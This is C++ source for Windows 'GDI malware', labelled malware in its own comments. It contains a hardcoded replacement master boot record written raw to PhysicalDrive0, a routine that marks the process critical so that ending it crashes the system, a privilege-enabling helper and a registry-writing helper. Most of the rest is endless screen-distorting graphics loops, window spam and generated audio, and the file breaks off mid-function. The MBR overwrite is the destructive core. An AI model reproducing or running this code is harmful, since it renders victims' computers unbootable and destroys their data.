// pxvmdmnzxq.cpp : Defines the entry point for the application.
//

#include <windows.h>
#include <tchar.h>
#include <ctime>
//#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
//#include "bootrec.h"
#define M_PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, *PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}
const unsigned char MasterBootRecord[] = {
	0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E, 0xE8, 0x8E, 0xD0,
	0x66, 0xBC, 0x00, 0x7C, 0x00, 0x00, 0x66, 0x89, 0xE5, 0xEA, 0x1A, 0x7C,
	0x00, 0x00, 0x30, 0xE4, 0xB0, 0x13, 0xCD, 0x10, 0x0F, 0x31, 0xA3, 0xA9,
	0x7C, 0xE8, 0x24, 0x00, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBF, 0xFF, 0xF9,
	0xB1, 0x40, 0xEB, 0x44, 0x89, 0xD8, 0xC1, 0xE0, 0x07, 0x31, 0xC3, 0x89,
	0xD8, 0xC1, 0xE8, 0x09, 0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE0, 0x08, 0x31,
	0xC3, 0x89, 0xD8, 0xC3, 0xB4, 0x02, 0x30, 0xFF, 0x30, 0xD2, 0xCD, 0x10,
	0xBE, 0xAB, 0x7C, 0xAC, 0x08, 0xC0, 0x74, 0x15, 0x50, 0x8B, 0x1E, 0xA9,
	0x7C, 0xE8, 0xD0, 0xFF, 0x31, 0x06, 0xA9, 0x7C, 0x88, 0xC3, 0x58, 0xB4,
	0x0E, 0xCD, 0x10, 0xEB, 0xE6, 0xFE, 0xC6, 0x74, 0x02, 0xEB, 0xD5, 0xC3,
	0x8B, 0x1E, 0xA9, 0x7C, 0xE8, 0xB5, 0xFF, 0x31, 0x06, 0xA9, 0x7C, 0x31,
	0xD2, 0xBB, 0x03, 0x00, 0xF7, 0xF3, 0x89, 0xD0, 0x00, 0xC8, 0x26, 0x88,
	0x05, 0x4F, 0x83, 0xFF, 0xFF, 0x75, 0xE1, 0xBF, 0xFF, 0xF9, 0x80, 0xF9,
	0x33, 0x7F, 0x04, 0xFE, 0xC1, 0xEB, 0xD5, 0xFE, 0xC5, 0xB1, 0x40, 0xEB,
	0xCF, 0x00, 0x10, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78,
	0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71,
	0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20,
	0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70,
	0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70, 0x78,
	0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x70, 0x78, 0x76, 0x6D,
	0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64,
	0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D,
	0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E,
	0x7A, 0x78, 0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A,
	0x78, 0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78,
	0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71,
	0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20,
	0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70,
	0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70, 0x78,
	0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70, 0x78, 0x76,
	0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70, 0x78, 0x76, 0x6D,
	0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64,
	0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D,
	0x6E, 0x7A, 0x78, 0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E,
	0x7A, 0x78, 0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A,
	0x78, 0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78,
	0x71, 0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71,
	0x20, 0x70, 0x78, 0x76, 0x6D, 0x64, 0x6D, 0x6E, 0x7A, 0x78, 0x71, 0x20,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
	return 1;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}

LPCWSTR  generateRandomUnicodeString(int len)
{
	wchar_t* ustr = new wchar_t[len + 1];      // +1 for '\0'

	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 256) + 1024;
	}
	ustr[len] = L'\0';
	return ustr;
}

DWORD WINAPI noskid1(LPVOID lpParam) {
	int ticks = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 1;; i++, i %= 21) {
		if (!i) for (int c = 0; c < 100; c++) InvalidateRect(0, 0, 0);
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0; BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000)
			bt = 2 + rand() & 255;
		for (int i = 1; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0)
				v = 2 + rand() % 5;
			((BYTE*)(data + i))[v % 3] += ((BYTE*)(data + bt))[bt] ^ i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, NOTSRCERASE);
		DeleteObject(hbm);
		DeleteObject(hdcMem);
		DeleteObject(hdc);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI noskid2(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	DOUBLE angle = 0.f;
	SetStretchBltMode(hdcCopy, 4);
	SetStretchBltMode(hdc, 4);
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int j = 4 * i;
				int fx = (int)(j + (j * sin(x / 16.0)) + j + (j * tan(y / 8.0)) + j + (j * cos((x + y) / 16.0)) + j + (j * sin(sqrt((double)(x * x + y * y)) / 8.0))) / 4;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx) / 10000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;
				if (hslcolor.l < .4f) {
					hslcolor.l += .4f;
				}
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI noskid3(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += x + int(128.0 + 128 * sin(3.1415 * x / 32.0));
			rgbScreen[i].g = y + int(128.0 + 128 * sin(3.1415 * x / 64.0));
			rgbScreen[i].b -= x + int(128.0 + 128 * sin(3.1415 * x / 128.0));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI noskid31(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 1 + 1;
		wPt[0].y = wRect.top + 7 + 6;
		wPt[1].x = wRect.right + 2 + 3;
		wPt[1].y = wRect.top + 5 + 9;
		wPt[2].x = wRect.left + 2 + 6;
		wPt[2].y = wRect.bottom + 0 + 3;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}

DWORD WINAPI noskid4(LPVOID lpParam) {
	while (true) {
		HDC desk = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		int rx = rand() % sw;
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, NOTSRCCOPY);
		StretchBlt(desk, rand() % sw, rand() % sh, sw, sh, desk, rand() % sw, rand() % sh, sw, sh, SRCCOPY);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 1000, rand() % 1000, rand() % 1000));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, NOTSRCCOPY);
		BitBlt(desk, rand() % sw, rand() % sh, sw, sh, desk, rand() % sw, rand() % sh, NOTSRCERASE);
		StretchBlt(desk, rand() % sw, rand() % sh, sw, sh, desk, rand() % sw, rand() % sh, sw, sh, SRCCOPY);
		StretchBlt(desk, 10, 10, sw - 20, sh - 20, desk, 0, 0, sw, sh, SRCINVERT);
		StretchBlt(desk, -10, -10, sw + 20, sh + 20, desk, 0, 0, sw, sh, SRCPAINT);
		DeleteObject(brush);
		ReleaseDC(0, desk);
	}
}

DWORD WINAPI noskid5(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				FLOAT fx = (tan(x * y) + (i + i * 10));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 500.f + y / screenHeight * .8f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI noskid6(LPVOID lpParam)
{
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -10, 0, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -10, SRCPAINT);
		HBRUSH brush2 = CreateSolidBrush(RGB(rand() % 255, 0, rand() % 255));
		SelectObject(hdc, brush2);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		DeleteObject(brush2);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, hdc, rand() % 5, rand() % 5, SRCINVERT);
		ReleaseDC(0, hdc);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}

DWORD WINAPI noskid61(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);


	while (1)
	{
		hdc = GetDC(NULL);
		// Create an array of TRIVERTEX structures that describe 
		// positional and color values for each vertex. For a rectangle, 
		// only two vertices need to be defined: upper-left and lower-right. 
		TRIVERTEX vertex[2];
		vertex[0].x = rand() % w;
		vertex[0].y = rand() % h;
		vertex[0].Red = 0xf800;
		vertex[0].Green = 0x7000;
		vertex[0].Blue = 0x7000;
		vertex[0].Alpha = 0x0000;

		vertex[1].x = rand() % w;
		vertex[1].y = rand() % h;
		vertex[1].Red = 0x8000;
		vertex[1].Green = 0x9100;
		vertex[1].Blue = 0xff00;
		vertex[1].Alpha = 0x0000;

		// Create a GRADIENT_RECT structure that 
		// references the TRIVERTEX vertices. 
		GRADIENT_RECT gRect;
		gRect.UpperLeft = 0;
		gRect.LowerRight = 1;

		// Draw a shaded rectangle. 
		GradientFill(hdc, vertex, 2, &gRect, 1, GRADIENT_FILL_RECT_H);
		ReleaseDC(0, hdc);
		Sleep(1);
	}

	return 0x00;
}

DWORD WINAPI noskid7(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, NOTSRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int codelib = i + i;
			int code = codelib | x * y;
			rgbScreen[i].r += code;
			rgbScreen[i].g += code;
			rgbScreen[i].b += Hue(239) | codelib;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
		Sleep(1);
	}
}

DWORD WINAPI noskid8(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, NOTSRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int Xii = x ^ x, Yii = y * y;
				int inc = 1 + i;
				int fx = (Xii - Yii + inc | Xii + Yii - inc) + (i * 100);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 1500.f + y / h * .1f + i / 5000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l += 0.2f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI noskid9(LPVOID lpParam) { //noskid
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int average = round((float)(rgbScreen[i].b + rgbScreen[i].r + rgbScreen[i].g) / 10);
			rgbScreen[i].r = average;
			rgbScreen[i].g = average;
			rgbScreen[i].b = average;
			rgbScreen[i].rgb += 3;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam) {
	switch (iMessage)
	{

	}
	return(DefWindowProc, hWnd, iMessage, wParam, lParam);
}
DWORD WINAPI windowdrop(LPVOID lpParam) {
	HINSTANCE hins;
	while (1) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HWND hWnd;
		MSG Message;
		WNDCLASS WndClass;
		LPCWSTR name = L"No Skid";
		WndClass.cbClsExtra = 0;
		WndClass.cbWndExtra = 0;
		WndClass.hbrBackground = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		WndClass.hCursor = LoadCursorW(0, IDC_ARROW);
		WndClass.hIcon = LoadIconW(0, IDI_APPLICATION);
		WndClass.hInstance = hins;
		WndClass.lpfnWndProc = WndProc;
		WndClass.lpszClassName = name;
		WndClass.lpszMenuName = 0;
		WndClass.style = CS_HREDRAW | CS_VREDRAW;
		RegisterClassW(&WndClass);
		hWnd = CreateWindowExW(0, name, name, WS_OVERLAPPEDWINDOW, rand() % w, rand() % h, rand() % w, rand() % h, 0, 0, hins, 0);
		ShowWindow(hWnd, SW_SHOW);
		Sleep(rand() % 1000);
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((t * 3 * (((t >> 10 & t) + t) * (((t >> 13) + 1) & t) + (t >> 13 & t)))));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((((t << (t >> 5 & t)) + (t << (t >> 114)) + (t << (t >> 10 & t)))));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
